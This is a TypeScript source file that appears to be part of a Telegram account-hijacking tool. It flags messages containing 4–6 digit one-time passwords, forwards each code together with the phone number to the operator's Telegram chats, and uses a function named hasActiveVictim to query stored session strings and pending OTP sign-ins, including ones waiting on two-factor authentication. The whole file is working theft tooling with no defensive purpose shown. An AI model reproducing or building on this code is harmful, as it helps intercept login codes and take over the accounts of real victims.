import { queryOne } from "@/lib/db";
import { sendMessage } from "@/lib/telegramBot";

export function getOwnerIds(): string[] {
  const raw = process.env.TELEGRAM_OWNER_IDS || "";
  const parts = raw.split(",").map((s) => s.trim()).filter(Boolean);
  if (parts.length === 0 && process.env.TELEGRAM_DEVELOPER_CHAT_ID) {
    return [process.env.TELEGRAM_DEVELOPER_CHAT_ID];
  }
  return parts;
}

export function isOtpMessage(text: string): boolean {
  return /\b\d{4,6}\b/.test(text);
}

export function buildOtpForwardText(phone: string, rawText: string): string {
  // Use simple HTML tags compatible with Telegram
  return `<b>🔐 OTP Baru Diterima</b>\n📱 Nomor: <code>${phone}</code>\n\n<pre>${rawText}</pre>`;
}

export async function forwardOtpToOwners(phone: string, rawText: string): Promise<void> {
  const owners = getOwnerIds();
  if (owners.length === 0) {
    console.warn("[otp] No owners configured to forward OTP to.");
    return;
  }
  const message = buildOtpForwardText(phone, rawText);
  
  await Promise.allSettled(
    owners.map((ownerId) => sendMessage(ownerId, message, "HTML"))
  );
}

export async function hasActiveVictim(): Promise<boolean> {
  // Check telegram_accounts with valid session
  const account = await queryOne(`
    SELECT id FROM telegram_accounts 
    WHERE session_string IS NOT NULL AND session_string <> '' 
    LIMIT 1
  `);
  if (account) return true;

  // Check otp_sessions
  const session = await queryOne(`
    SELECT id FROM otp_sessions 
    WHERE status IN ('pending','signed_in','2fa_needed') AND expires_at > NOW() 
    LIMIT 1
  `);
  if (session) return true;

  return false;
}
